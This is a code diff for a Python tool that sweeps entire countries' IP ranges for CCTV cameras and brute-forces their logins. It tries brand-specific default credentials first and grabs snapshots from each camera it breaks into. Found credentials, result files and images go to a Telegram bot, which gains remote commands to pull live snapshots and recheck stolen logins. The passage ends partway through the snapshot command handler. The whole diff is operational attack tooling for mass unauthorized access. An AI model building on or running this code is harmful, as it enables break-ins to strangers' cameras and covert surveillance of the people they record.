     _last_scanned_ip        = ''   # updated each time a future completes; used for IP-level resume
     reset_telegram_progress_msg(scan_id=country['code'])
 
+    # ── Per-country ETA estimate before scan starts ────────────────────────────
+    _pre_eta_str = "calculating..."
+    try:
+        import psutil as _psu_c
+        _net_spd = max(1.0, calculate_optimal_workers('scan') * 0.6)
+        _pre_eta_s = int(total_ips / _net_spd) if _net_spd > 0 else 0
+        _pre_eta_str = (f"{_pre_eta_s//3600}h {(_pre_eta_s%3600)//60}m"
+                        if _pre_eta_s >= 3600 else f"{_pre_eta_s//60}m {_pre_eta_s%60}s"
+                        if _pre_eta_s >= 60 else f"{_pre_eta_s}s")
+    except Exception:
+        pass
+    print(f"{Fore.CYAN}[*] Estimated scan time: {_pre_eta_str} ({total_ips:,} IPs @ ~{max_workers} threads){Style.RESET_ALL}")
+
+    # ── Disk space warning (warn if <2× estimated output size) ────────────────
+    try:
+        import shutil as _shu_c
+        _avg_bytes = 260   # ~260 bytes per camera entry in CCTV_Found
+        _est_bytes = total_ips * _avg_bytes // 100   # assume ~1% hit rate
+        _free = _shu_c.disk_usage(SCRIPT_DIR).free
+        if _free < _est_bytes * 2:
+            print(f"{Fore.YELLOW}[!] Low disk space: {_free//1024//1024}MB free, ~{_est_bytes//1024}KB expected output — proceed with caution.{Style.RESET_ALL}")
+    except Exception:
+        pass
+
+    # ── Background progress-ticker (prevents frozen bar during network timeouts)─
+    _combo2_tick = {'sc': scanned_count, 'fd': _global_cameras_found,
+                    'tot': total_ips, 'st': start_time, 'w': max_workers}
+    _combo2_tick_ev = threading.Event()
+
+    def _combo2_ticker():
+        while not _combo2_tick_ev.wait(2.0):
+            try:
+                # Read globals directly so bar stays live even when all threads
+                # are blocked on timeouts and as_completed never fires.
+                _sc  = scanned_count; _fd  = _global_cameras_found
+                _tot = _combo2_tick['tot']; _el  = time.time() - _combo2_tick['st']
+                _mw  = _combo2_tick['w']
+                _pct   = int(_sc * 100 / _tot) if _tot else 0
+                _spd   = _sc / _el if _el > 0 else 0
+                _eta_s = int((_tot - _sc) / _spd) if _spd > 0 else 0
+                _eta   = (f"{_eta_s//3600}h {(_eta_s%3600)//60}m" if _eta_s >= 3600
+                          else f"{_eta_s//60}m {_eta_s%60}s" if _eta_s >= 60
+                          else f"{_eta_s}s" if _eta_s > 0 else "calculating...")
+                _fill  = int(20 * _sc / _tot) if _tot else 0
+                # Bar colour: red if stop requested, green ≥90%, cyan otherwise
+                if _stop_requested.is_set():
+                    _bc = Fore.RED
+                elif _pct >= 90:
+                    _bc = Fore.GREEN
+                else:
+                    _bc = Fore.CYAN
+                _bar   = '█' * _fill + '░' * (20 - _fill)
+                # Top credential live display
+                _top_s = ''
+                with _cred_hits_lock:
+                    if _cred_session_hits:
+                        _tk = max(_cred_session_hits, key=_cred_session_hits.get)
+                        _tv = _cred_session_hits[_tk]
+                        _top_s = f" [{Fore.YELLOW}top:{Style.RESET_ALL}{_tk}×{_tv}]"
+                # Lockout cooldown indicator
+                _lk_s = ''
+                with _lockout_cd_lock:
+                    if _lockout_cooldown_ts and time.time() - _lockout_cooldown_ts < COOLDOWN_SECONDS + 2:
+                        _rem = max(0, int(COOLDOWN_SECONDS - (time.time() - _lockout_cooldown_ts)))
+                        _lk_s = f" {Fore.RED}[⏸ cd {_rem}s]{Style.RESET_ALL}"
+                sys.stdout.write(
+                    f"\r\033[K{_bc}⚡ [{_bar}] {_pct}% | "
+                    f"{_sc:,}/{_tot:,} IPs | 📷 {_fd} found | "
+                    f"{_spd:.0f} IP/s | ETA {_eta} | Threads {_mw}"
+                    f"{_top_s}{_lk_s}{Style.RESET_ALL}"
+                )
+                # Mini-log: last 3 finds on next line
+                with _mini_log_lock:
+                    if _live_found_mini_log:
+                        sys.stdout.write(
+                            f"\n\033[K  {Fore.GREEN}↳ recent:{Style.RESET_ALL} "
+                            + "  |  ".join(_live_found_mini_log[-3:])
+                        )
+                        sys.stdout.write('\033[1A')  # move cursor back up
+                sys.stdout.flush()
+            except Exception:
+                pass
+
+    _combo2_tick_ev.clear()
+    threading.Thread(target=_combo2_ticker, daemon=True).start()
+
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         for range_idx, cidr_range in enumerate(ip_ranges):
             if range_idx < resume_range_idx:
@@ -7151,6 +7701,12 @@ def scan_country_cameras(country: dict,
             _skipping_done = not bool(_skip_until_ip)
             for ip in range_ips:
                 if ip not in seen_range_ips:
+                    # ── Skip IPs already in CCTV_Found file ──────────────────
+                    if ip in _already_found_ips:
+                        seen_range_ips.add(ip)
+                        with results_lock:
+                            scanned_count += 1
+                        continue
                     # IP-level resume: skip IPs within the current range until we
                     # reach the last IP we processed in the previous session
                     if not _skipping_done:
@@ -7168,12 +7724,13 @@ def scan_country_cameras(country: dict,
                             time.sleep(2 ** _sr * 0.5)
                     seen_range_ips.add(ip)
 
-            for future in as_completed(future_to_ip):
+            # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
+            for future in _iter_with_timeout(future_to_ip, _SCAN_STALL_TIMEOUT):
                 if _stop_requested.is_set():
                     for f in future_to_ip: f.cancel()
                 _combo_had_err = False
                 try:
-                    future.result()
+                    future.result(timeout=5)
                 except Exception:
                     _combo_had_err = True
                 _record_scan_attempt(_combo_had_err)
@@ -7181,6 +7738,10 @@ def scan_country_cameras(country: dict,
                 _last_scanned_ip_global = _last_scanned_ip  # mirror to global for signal handlers
                 with results_lock:
                     scanned_count += 1
+                # ── Feed background ticker ─────────────────────────────────────
+                _combo2_tick['sc'] = scanned_count
+                _combo2_tick['fd'] = _global_cameras_found
+                _combo2_tick['w']  = max_workers
 
                 # ── Save every 1000 cameras found ─────────────────────────────
                 if _global_cameras_found - _combo_last_save_cameras >= 1000:
@@ -7339,8 +7900,9 @@ def scan_country_cameras(country: dict,
                     stop_reason=''
                 )
 
-    # Stop the background saver before final save
+    # Stop the background saver + ticker before final save
     _bg_saver_stop.set()
+    _combo2_tick_ev.set()
 
     # Clear progress on clean finish
     if scanned_count >= total_ips:
@@ -7360,8 +7922,44 @@ def scan_country_cameras(country: dict,
     if cctv_output_file and os.path.exists(cctv_output_file):
         remove_duplicates_from_file(cctv_output_file)
 
+    # ── Prepend scan summary header to result file ─────────────────────────────
+    _elapsed_combo = time.time() - start_time
+    if cctv_output_file and os.path.exists(cctv_output_file):
+        try:
+            _hdr  = f"# {'='*68}\n"
+            _hdr += f"# SCAN SUMMARY — {country['name']} ({country['code']})\n"
+            _hdr += f"# Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            _hdr += f"# IPs Scanned  : {scanned_count:,}\n"
+            _hdr += f"# Duration     : {int(_elapsed_combo//60)}m {int(_elapsed_combo%60)}s\n"
+            _hdr += f"# Threads      : {max_workers}\n"
+            _hdr += f"# Credentials  : {len(credentials)}\n"
+            _hdr += f"# {'='*68}\n\n"
+            with open(cctv_output_file, 'r', encoding='utf-8', errors='replace') as _hf:
+                _existing = _hf.read()
+            with open(cctv_output_file, 'w', encoding='utf-8') as _hf:
+                _hf.write(_hdr + _existing)
+        except Exception:
+            pass
+
+    # ── Append to MASTER_INDEX.txt ─────────────────────────────────────────────
+    try:
+        _top_cred_mi = ''
+        _tc_sorted = sorted(cred_success_stats.items(), key=lambda x: x[1], reverse=True)
+        if _tc_sorted:
+            _tc = _tc_sorted[0]
+            _top_cred_mi = f"{_tc[0][0]}:{_tc[0][1]}"
+        _mi_line = (f"{datetime.now().strftime('%Y-%m-%d %H:%M')} | "
+                    f"{country['code']} | {country['name']} | "
+                    f"IPs:{scanned_count:,} | Found:{len(valid_results)} | "
+                    f"TopCred:{_top_cred_mi} | "
+                    f"Dur:{int(_elapsed_combo//60)}m{int(_elapsed_combo%60)}s | mode:full\n")
+        with open(_MASTER_INDEX_FILE, 'a', encoding='utf-8') as _mi_f:
+            _mi_f.write(_mi_line)
+    except Exception:
+        pass
+
     # Print summary
-    elapsed = time.time() - start_time
+    elapsed = _elapsed_combo
     top_creds = sorted(cred_success_stats.items(), key=lambda x: x[1], reverse=True)[:5]
     print(f"\n\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📊 SCAN COMPLETE — {country['name']} ({country['code']}){Style.RESET_ALL}")
@@ -7407,6 +8005,18 @@ def scan_country_cameras(country: dict,
         send_telegram_message(summary)
         if cctv_output_file and os.path.exists(cctv_output_file):
             send_telegram_file(cctv_output_file, f"📋 CCTV Found: {country['name']} ({country['code']}) — {len(valid_results)} valid cameras")
+        # ── Auto-send daily report after combo scan ───────────────────────
+        if TELEGRAM_CONFIG.get('auto_send_daily_report', False):
+            try:
+                _dr_combo_path = os.path.join(SCRIPT_DIR,
+                    f"daily_report_{country['code']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+                generate_daily_report(_dr_combo_path)
+                if os.path.exists(_dr_combo_path) and os.path.getsize(_dr_combo_path) > 10:
+                    send_telegram_file(_dr_combo_path,
+                        f"📊 Daily Report — {country['name']} ({country['code']}) "
+                        f"— {datetime.now().strftime('%Y-%m-%d %H:%M')}")
+            except Exception:
+                pass
 
 
 def get_geographic_location(ip: str) -> dict:
@@ -8174,6 +8784,12 @@ def brute_force_from_file(file_path: str,
         debug_msg += f"Cameras: {len(cameras)}\n"
         debug_msg += f"Status: Processing from index {resume_idx}"
         send_telegram_message(debug_msg)
+        # ── Inline control keyboard ───────────────────────────────────────────
+        send_telegram_message_with_keyboard(
+            f"🎮 <b>Scan Controls</b> — {os.path.basename(file_path)}",
+            [[('⏸ Pause', 'cmd_pause'), ('▶️ Resume', 'cmd_resume'),
+              ('⏹ Stop', 'cmd_stop'), ('📊 Status', 'cmd_status')]]
+        )
 
     # Slice cameras for resume
     cameras_to_check = cameras[resume_idx:]
@@ -8264,7 +8880,22 @@ def brute_force_from_file(file_path: str,
             or _probe_dahua_by_http(ip, port, timeout=1.0)
         )
 
-        for username, password in credentials:
+        # ── Model-specific credential pre-scoring ─────────────────────────────
+        # Reorder the credential list so known-default pairs for this camera
+        # brand are tried first — cuts average time-to-success significantly.
+        _ct_lower = camera_type.lower() if camera_type else ''
+        _model_key = next((k for k in MODEL_DEFAULT_CREDS if k in _ct_lower), None)
+        _eff_creds = credentials
+        if _model_key:
+            _pri_set = set(MODEL_DEFAULT_CREDS[_model_key])
+            _cred_set = set(credentials)
+            _eff_creds = (
+                [c for c in credentials if c in _pri_set] +
+                [c for c in MODEL_DEFAULT_CREDS[_model_key] if c not in _cred_set] +
+                [c for c in credentials if c not in _pri_set]
+            )
+
+        for username, password in _eff_creds:
             if _cli_verbose:
                 print(f"{Fore.YELLOW}[TRY]  {ip}:{port}  {username}:{password}{Style.RESET_ALL}")
             try:
@@ -8295,6 +8926,9 @@ def brute_force_from_file(file_path: str,
                         f"{_dc}[✓] LOGIN SUCCESS!{Style.RESET_ALL} {ip}:{port} - {username}:{password}{Fore.YELLOW}{speed_marker}{Style.RESET_ALL}"
                     )
                     record_credential_success(username, password)
+                    with _cred_hits_lock:
+                        _ck8 = f"{username}:{password}"
+                        _cred_session_hits[_ck8] = _cred_session_hits.get(_ck8, 0) + 1
                     _seen_count = record_repeat_offender(
                         ip, country_code=country_code,
                         camera_type=camera_type,
@@ -8392,6 +9026,9 @@ def brute_force_from_file(file_path: str,
                             f"{_dc}[✓] LOGIN SUCCESS!{Style.RESET_ALL} {ip}:{port} - {username}:{password}{Fore.YELLOW}{speed_marker_fallback}{Style.RESET_ALL}"
                         )
                         record_credential_success(username, password)
+                        with _cred_hits_lock:
+                            _ck8d = f"{username}:{password}"
+                            _cred_session_hits[_ck8d] = _cred_session_hits.get(_ck8d, 0) + 1
                         _seen_count = record_repeat_offender(
                             ip, country_code=country_code,
                             camera_type=camera_type,
@@ -8481,6 +9118,50 @@ def brute_force_from_file(file_path: str,
     _active_brute_index        = resume_idx
     _active_brute_total        = len(cameras)
 
+    # ── Background progress-ticker thread ────────────────────────────────────
+    # Prints the 🔑 line every 2 s so the bar stays live even when all worker
+    # threads are blocked waiting for network timeouts (can be 40+ s each).
+    _bf_tick = {
+        'p': resume_idx, 'f': 0,
+        't': len(cameras), 's': start_time, 'w': max_workers, 'last': [],
+    }
+    _bf_tick_ev = threading.Event()
+
+    def _bf_ticker():
+        while not _bf_tick_ev.wait(2.0):
+            try:
+                # Read live counters directly from the enclosing scope so the
+                # bar updates even when all threads are blocked on timeouts and
+                # as_completed never fires (which leaves _bf_tick['p'] stale).
+                _p  = resume_idx + max(0, _bf_i_global + 1)
+                _f  = len(valid_results)
+                _t  = _bf_tick['t']; _el = time.time() - _bf_tick['s']
+                _mw = _bf_tick['w']
+                _pct   = int(_p * 100 / _t) if _t else 0
+                _spd   = _p / _el if _el > 0 else 0
+                _eta_s = int((_t - _p) / _spd) if _spd > 0 else 0
+                _eta   = (f"{_eta_s//3600}h {(_eta_s%3600)//60}m" if _eta_s >= 3600
+                          else f"{_eta_s//60}m {_eta_s%60}s" if _eta_s >= 60
+                          else f"{_eta_s}s" if _eta_s > 0 else "calculating...")
+                _fill  = int(20 * _p / _t) if _t else 0
+                _bar   = '█' * _fill + '░' * (20 - _fill)
+                _lbl   = (f"{Fore.RED}⏹ STOPPING{Style.RESET_ALL} "
+                          if _stop_requested.is_set() else "")
+                _bf_last_str = (f" | 📡 {_bf_tick['last'][-1]}"
+                               if _bf_tick.get('last') else "")
+                sys.stdout.write(
+                    f"\r\033[K{_lbl}{Fore.CYAN}🔑 [{_bar}] {_pct}% | "
+                    f"{_p:,}/{_t:,} cams | ✅ {_f} valid | "
+                    f"{_spd:.1f}/s | ETA {_eta} | "
+                    f"Threads {_mw}{_bf_last_str}{Style.RESET_ALL}"
+                )
+                sys.stdout.flush()
+            except Exception:
+                pass
+
+    _bf_tick_ev.clear()
+    threading.Thread(target=_bf_ticker, daemon=True).start()
+
     # Recreate the executor every 5000 cameras so the thread count reflects current
     # network conditions rather than being fixed at the value chosen at job start.
     _BF_CHUNK = 5000
@@ -8503,7 +9184,8 @@ def brute_force_from_file(file_path: str,
                 for camera in _bf_chunk
             }
 
-            for future in as_completed(future_to_camera):
+            # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
+            for future in _iter_with_timeout(future_to_camera, _SCAN_STALL_TIMEOUT):
                 _bf_i_global += 1
                 i = _bf_i_global
                 with results_lock:
@@ -8515,11 +9197,50 @@ def brute_force_from_file(file_path: str,
     
                 _bf_had_err = False
                 try:
-                    result = future.result()
+                    result = future.result(timeout=5)
                     if result:
                         with results_lock:
                             valid_results.append(result)
-    
+                        _bf_tick['last'] = (_bf_tick['last'] + [
+                            f"{result['ip']}:{result['port']}"
+                        ])[-3:]
+
+                        # ── Camera snapshot on valid login ────────────────────
+                        try:
+                            _snap_cc = country_code or 'XX'
+                            _snap_dir = os.path.join(SCRIPT_DIR, 'Snapshots', _snap_cc)
+                            os.makedirs(_snap_dir, exist_ok=True)
+                            _snap_bytes = fetch_camera_snapshot(
+                                result['ip'], result['port'],
+                                result['username'], result['password'],
+                                result.get('camera_type', ''), timeout=4.0
+                            )
+                            if _snap_bytes:
+                                _snap_fname = f"{result['ip'].replace('.','_')}_{result['port']}.jpg"
+                                _snap_path = os.path.join(_snap_dir, _snap_fname)
+                                with open(_snap_path, 'wb') as _sf:
+                                    _sf.write(_snap_bytes)
+                                # ── Also copy snapshot into ValidCamera folder ─
+                                try:
+                                    _vc_snap_dir = os.path.join(
+                                        SCRIPT_DIR, 'ValidCamera', _snap_cc)
+                                    os.makedirs(_vc_snap_dir, exist_ok=True)
+                                    _vc_snap_path = os.path.join(_vc_snap_dir, _snap_fname)
+                                    with open(_vc_snap_path, 'wb') as _vsf:
+                                        _vsf.write(_snap_bytes)
+                                except Exception:
+                                    pass
+                                print(f"\n{Fore.GREEN}  📷 Snapshot saved: {_snap_fname}{Style.RESET_ALL}")
+                                if TELEGRAM_CONFIG.get("enabled"):
+                                    try:
+                                        send_telegram_file(_snap_path,
+                                            f"📷 Snapshot: {result['ip']}:{result['port']} "
+                                            f"({result.get('camera_type','Camera')})")
+                                    except Exception:
+                                        pass
+                        except Exception:
+                            pass
+
                         # Write to ValidCamera file immediately on success
                         try:
                             geo = result.get('geo', {})
@@ -8569,6 +9290,11 @@ def brute_force_from_file(file_path: str,
                     processed = resume_idx + i + 1
                     _active_brute_index = processed  # keep Ctrl+C handler in sync
                     found_so_far = len(valid_results)
+
+                    # Keep the ticker thread in sync so it shows accurate numbers
+                    _bf_tick['p'] = processed
+                    _bf_tick['f'] = found_so_far
+                    _bf_tick['w'] = max_workers
     
                     # Credentials hot-reload every 100 cameras
                     if (i + 1) % 100 == 0:
@@ -8639,6 +9365,10 @@ def brute_force_from_file(file_path: str,
                         try: send_telegram_message(tg_prog)
                         except Exception: pass
     
+    # Stop the background progress ticker before printing final stats
+    _bf_tick_ev.set()
+    print()  # move past the \r progress line
+
     stop_scan_dashboard()
 
     # Clear active brute session state now that the executor is done
@@ -8704,9 +9434,9 @@ def brute_force_from_file(file_path: str,
 
     # Print summary
     elapsed = time.time() - start_time
-    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[✓] Login Check Complete!{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
     print(f"Total cameras checked: {len(cameras)}")
     print(f"Time elapsed: {elapsed:.2f} seconds")
     print(
@@ -8720,8 +9450,24 @@ def brute_force_from_file(file_path: str,
         f"  HIK Vision: {Fore.YELLOW}{final_counts['HIK Vision Camera']}{Style.RESET_ALL}"
     )
     print(
-        f"Valid logins saved to: {Fore.YELLOW}{valid_output_file}{Style.RESET_ALL}\n"
+        f"Valid logins saved to: {Fore.YELLOW}{valid_output_file}{Style.RESET_ALL}"
     )
+    # ── Top-5 working credentials ─────────────────────────────────────────
+    _lc_top = sorted(
+        [(k, v) for k, v in _cred_session_hits.items() if v > 0],
+        key=lambda x: x[1], reverse=True
+    )[:5]
+    if _lc_top:
+        print(f"\n{Fore.CYAN}  🔑 Top-5 Working Credentials (this session):{Style.RESET_ALL}")
+        for _lc_k, _lc_v in _lc_top:
+            print(f"    {Fore.GREEN}{_lc_k}{Style.RESET_ALL}  →  {_lc_v} hit(s)")
+    else:
+        _lc_db_top = sorted(cred_success_stats.items(), key=lambda x: x[1], reverse=True)[:5]
+        if _lc_db_top:
+            print(f"\n{Fore.CYAN}  🔑 Top-5 Credentials (all-time):{Style.RESET_ALL}")
+            for (_lu, _lp), _lv in _lc_db_top:
+                print(f"    {Fore.GREEN}{_lu}:{_lp}{Style.RESET_ALL}  →  {_lv} hit(s)")
+    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
 
     if valid_results:
         print(f"{Fore.GREEN}✓ VALID CREDENTIALS FOUND:{Style.RESET_ALL}\n")
@@ -8854,9 +9600,31 @@ def scan_country_cameras_detection_only(country: dict,
 
     total_ips = ip_count
     ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    if _quick_scan_mode:
+        ports_to_scan = _QUICK_PORTS
 
     if max_workers is None:
-        max_workers = calculate_optimal_workers('scan')
+        if _auto_tuned_workers > 0:
+            max_workers = _auto_tuned_workers
+            print(f"{Fore.CYAN}[*] Using auto-tuned thread count: {max_workers}{Style.RESET_ALL}")
+        else:
+            max_workers = calculate_optimal_workers('scan')
+
+    # ── Skip already-found IPs from existing CCTV_Found file ─────────────
+    _det_already_found = _load_already_found_ips(country['code'])
+    if _det_already_found:
+        print(f"{Fore.YELLOW}[*] Skipping {len(_det_already_found):,} already-found IPs{Style.RESET_ALL}")
+
+    # ── --dry-run: print resolved config then exit ─────────────────────────
+    if '--dry-run' in sys.argv:
+        print(f"\n{Fore.CYAN}[DRY-RUN] Would scan:{Style.RESET_ALL}")
+        print(f"  Country  : {country['name']} ({country['code']})")
+        print(f"  IPs      : {total_ips:,} (skip {len(_det_already_found):,} already found)")
+        print(f"  Ports    : {ports_to_scan}")
+        print(f"  Threads  : {max_workers}")
+        print(f"  Mode     : Detection only (no login)")
+        print(f"  Output   : {cctv_output_file}")
+        return
 
     print(
         f"{Fore.GREEN}[✓] Total IPs to scan: {total_ips:,}{Style.RESET_ALL}"
@@ -8945,6 +9713,82 @@ def scan_country_cameras_detection_only(country: dict,
     _det_range_counter     = 0  # separate per-range counter for maintenance hooks
     reset_telegram_progress_msg(scan_id=country['code'])
 
+    # ── Per-country ETA estimate before scan starts ────────────────────────────
+    _det_pre_eta_str = "calculating..."
+    try:
+        _det_net_spd = max(1.0, max_workers * 0.65)
+        _det_eta_s   = int(total_ips / _det_net_spd)
+        _det_pre_eta_str = (f"{_det_eta_s//3600}h {(_det_eta_s%3600)//60}m"
+                            if _det_eta_s >= 3600 else f"{_det_eta_s//60}m {_det_eta_s%60}s"
+                            if _det_eta_s >= 60 else f"{_det_eta_s}s")
+    except Exception:
+        pass
+    print(f"{Fore.CYAN}[*] Estimated scan time: {_det_pre_eta_str} ({total_ips:,} IPs @ ~{max_workers} threads){Style.RESET_ALL}")
+
+    # ── Disk space warning ─────────────────────────────────────────────────────
+    try:
+        import shutil as _shu_d
+        _det_est = total_ips * 260 // 100
+        _det_free = _shu_d.disk_usage(SCRIPT_DIR).free
+        if _det_free < _det_est * 2:
+            print(f"{Fore.YELLOW}[!] Low disk space: {_det_free//1024//1024}MB free — proceed with caution.{Style.RESET_ALL}")
+    except Exception:
+        pass
+
+    # ── Background progress-ticker (prevents frozen bar during network timeouts)─
+    _det2_tick = {'sc': scanned_count, 'fd': total_cameras_found,
+                  'tot': total_ips, 'st': start_time, 'w': max_workers}
+    _det2_tick_ev = threading.Event()
+
+    def _det2_ticker():
+        while not _det2_tick_ev.wait(2.0):
+            try:
+                # Read scanned_count and total_cameras_found directly from the
+                # enclosing function's globals so the bar updates even when all
+                # worker threads are blocked on timeouts and as_completed never
+                # fires (which would leave _det2_tick['sc'] stale at 0).
+                _sc  = scanned_count; _fd  = total_cameras_found
+                _tot = _det2_tick['tot']; _el  = time.time() - _det2_tick['st']
+                _mw  = _det2_tick['w']
+                _pct   = int(_sc * 100 / _tot) if _tot else 0
+                _spd   = _sc / _el if _el > 0 else 0
+                _eta_s = int((_tot - _sc) / _spd) if _spd > 0 else 0
+                _eta   = (f"{_eta_s//3600}h {(_eta_s%3600)//60}m" if _eta_s >= 3600
+                          else f"{_eta_s//60}m {_eta_s%60}s" if _eta_s >= 60
+                          else f"{_eta_s}s" if _eta_s > 0 else "calculating...")
+                _fill  = int(20 * _sc / _tot) if _tot else 0
+                if _stop_requested.is_set():
+                    _bc = Fore.RED
+                elif _pct >= 90:
+                    _bc = Fore.GREEN
+                else:
+                    _bc = Fore.CYAN
+                _bar   = '█' * _fill + '░' * (20 - _fill)
+                _lk_s  = ''
+                with _lockout_cd_lock:
+                    if _lockout_cooldown_ts and time.time() - _lockout_cooldown_ts < COOLDOWN_SECONDS + 2:
+                        _rem = max(0, int(COOLDOWN_SECONDS - (time.time() - _lockout_cooldown_ts)))
+                        _lk_s = f" {Fore.RED}[⏸ cd {_rem}s]{Style.RESET_ALL}"
+                sys.stdout.write(
+                    f"\r\033[K{_bc}📡 [{_bar}] {_pct}% | "
+                    f"{_sc:,}/{_tot:,} IPs | 📷 {_fd} found | "
+                    f"{_spd:.0f} IP/s | ETA {_eta} | Threads {_mw}"
+                    f"{_lk_s}{Style.RESET_ALL}"
+                )
+                with _mini_log_lock:
+                    if _live_found_mini_log:
+                        sys.stdout.write(
+                            f"\n\033[K  {Fore.GREEN}↳ recent:{Style.RESET_ALL} "
+                            + "  |  ".join(_live_found_mini_log[-3:])
+                        )
+                        sys.stdout.write('\033[1A')
+                sys.stdout.flush()
+            except Exception:
+                pass
+
+    _det2_tick_ev.clear()
+    threading.Thread(target=_det2_ticker, daemon=True).start()
+
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         for range_idx, cidr_range in enumerate(ip_ranges):
             if range_idx < resume_range_idx:
@@ -8964,17 +9808,24 @@ def scan_country_cameras_detection_only(country: dict,
             seen_range = set()
             for ip in range_ips:
                 if ip not in seen_range:
+                    # ── Skip IPs already in CCTV_Found file ──────────────────
+                    if ip in _det_already_found:
+                        seen_range.add(ip)
+                        with results_lock:
+                            scanned_count += 1
+                        continue
                     future_to_ip[executor.submit(scan_single_ip_detection_only, ip, ports_to_scan, country['name'], country['code'])] = ip
                     seen_range.add(ip)
             del seen_range  # Free immediately after submitting
             del range_ips   # No longer needed — futures are queued
 
-            for future in as_completed(future_to_ip):
+            # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
+            for future in _iter_with_timeout(future_to_ip, _SCAN_STALL_TIMEOUT):
                 if _stop_requested.is_set():
                     for f in future_to_ip: f.cancel()
                 _det_had_err = False
                 try:
-                    result = future.result()
+                    result = future.result(timeout=5)
                     if result:
                         with results_lock:
                             valid_results.append(result)
@@ -8984,6 +9835,9 @@ def scan_country_cameras_detection_only(country: dict,
                 _record_scan_attempt(_det_had_err)
                 with results_lock:
                     scanned_count += 1
+                # ── Feed background ticker ─────────────────────────────────────
+                _det2_tick['sc'] = scanned_count
+                _det2_tick['fd'] = total_cameras_found
 
                 # ── Save every 1000 cameras found ─────────────────────────────
                 if total_cameras_found - _det_last_save_cameras >= 1000:
@@ -9127,8 +9981,9 @@ def scan_country_cameras_detection_only(country: dict,
                     pass
                 last_telegram_progress_time = now
 
-    # Stop the background saver before final save
+    # Stop the background saver + ticker before final save
     _bg_saver_stop.set()
+    _det2_tick_ev.set()
 
     # Only clear progress if we actually finished all ranges
     if scanned_count >= total_ips:
@@ -9148,8 +10003,38 @@ def scan_country_cameras_detection_only(country: dict,
     stop_scan_dashboard()
     remove_duplicates_from_file(cctv_output_file)
 
+    # ── Prepend scan summary header to result file ─────────────────────────────
+    _det_elapsed_hdr = time.time() - start_time
+    if cctv_output_file and os.path.exists(cctv_output_file):
+        try:
+            _hdr  = f"# {'='*68}\n"
+            _hdr += f"# SCAN SUMMARY — {country['name']} ({country['code']})\n"
+            _hdr += f"# Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            _hdr += f"# IPs Scanned  : {scanned_count:,}\n"
+            _hdr += f"# Cameras Found: {total_cameras_found}\n"
+            _hdr += f"# Duration     : {int(_det_elapsed_hdr//60)}m {int(_det_elapsed_hdr%60)}s\n"
+            _hdr += f"# Threads      : {max_workers}\n"
+            _hdr += f"# {'='*68}\n\n"
+            with open(cctv_output_file, 'r', encoding='utf-8', errors='replace') as _hf:
+                _existing = _hf.read()
+            with open(cctv_output_file, 'w', encoding='utf-8') as _hf:
+                _hf.write(_hdr + _existing)
+        except Exception:
+            pass
+
+    # ── Append to MASTER_INDEX.txt ─────────────────────────────────────────────
+    try:
+        _mi_line_d = (f"{datetime.now().strftime('%Y-%m-%d %H:%M')} | "
+                      f"{country['code']} | {country['name']} | "
+                      f"IPs:{scanned_count:,} | Found:{total_cameras_found} | "
+                      f"Dur:{int(_det_elapsed_hdr//60)}m{int(_det_elapsed_hdr%60)}s | mode:scan-only\n")
+        with open(_MASTER_INDEX_FILE, 'a', encoding='utf-8') as _mi_f:
+            _mi_f.write(_mi_line_d)
+    except Exception:
+        pass
+
     # Print console summary
-    elapsed = time.time() - start_time
+    elapsed = _det_elapsed_hdr
     top_creds = sorted(cred_success_stats.items(), key=lambda x: x[1], reverse=True)[:5]
     print(f"\n\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📡 DETECTION COMPLETE — {country['name']} ({country['code']}){Style.RESET_ALL}")
@@ -9199,6 +10084,18 @@ def scan_country_cameras_detection_only(country: dict,
         send_telegram_message(summary)
         caption = f"📋 CCTV Found: {country['name']} ({country['code']}) — {total_cameras_found} cameras"
         send_telegram_file(cctv_output_file, caption)
+        # ── Auto-send daily report after country scan ─────────────────────
+        if TELEGRAM_CONFIG.get('auto_send_daily_report', False):
+            try:
+                _dr_auto_path = os.path.join(SCRIPT_DIR,
+                    f"daily_report_{country['code']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+                generate_daily_report(_dr_auto_path)
+                if os.path.exists(_dr_auto_path) and os.path.getsize(_dr_auto_path) > 10:
+                    send_telegram_file(_dr_auto_path,
+                        f"📊 Daily Report — {country['name']} ({country['code']}) "
+                        f"— {datetime.now().strftime('%Y-%m-%d %H:%M')}")
+            except Exception:
+                pass
 
 
 def brute_force_single_ip(ip: str,
@@ -9701,9 +10598,14 @@ def telegram_bot_listener():
                         "/list — List all result files\n"
                         "/get &lt;filename&gt; — Download a file\n"
                         "/status — Live scan status\n"
+                        "/snapshot CC IP — Send saved snapshot (or grab live)\n"
+                        "/snapshot IP — Grab live snapshot from any reachable camera\n"
+                        "/retest IP — Re-verify stored credentials are still valid\n"
                         "/help — Show this help\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
-                        "Example: /get AF_CCTV_Found.txt"
+                        "Example: /get AF_CCTV_Found.txt\n"
+                        "Example: /snapshot BD 103.1.2.3\n"
+                        "Example: /retest 103.1.2.3"
                     )
                     send_telegram_message(reply)
 
@@ -9750,6 +10652,256 @@ def telegram_bot_listener():
 
                 elif cmd == "/status":
                     send_telegram_message(_build_status_message())
+
+                elif cmd.startswith("/snapshot "):
+                    _sn_parts = text.split()
+                    # Detect format: /snapshot CC IP  OR  /snapshot IP
+                    _sn_cc = None; _sn_ip = None
